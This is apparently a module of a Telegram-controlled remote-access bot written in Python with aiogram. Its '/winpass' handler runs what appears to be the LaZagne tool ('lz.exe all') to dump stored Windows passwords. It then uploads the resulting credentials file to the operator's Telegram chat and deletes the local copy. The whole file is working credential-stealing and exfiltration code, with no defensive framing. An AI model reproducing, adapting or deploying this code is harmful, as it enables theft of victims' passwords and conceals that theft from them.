from aiogram import Router
from aiogram.types import Message, FSInputFile
from aiogram.filters.command import Command
import logging
import subprocess
import os

router: Router = Router()

home_dir = os.path.expanduser('~')


def get_filename():
    for root, dirs, files in os.walk(home_dir):
        for file in files:
            if file.startswith('credentials_'):
                filename = file
                return filename


@router.message(Command("winpass"))
async def send_win_passwords(message: Message):
    try:
        subprocess.run(["lz.exe", "all", "-oJ", "-output", home_dir], check=True)
        creds = get_filename()
        cred_path = home_dir + '\\' + creds
        file = FSInputFile(cred_path)
        await message.answer_document(file, caption="<b>Recovered Windows passwords</b>")
        os.remove(cred_path)
    except Exception as e:
        logging.error(e)
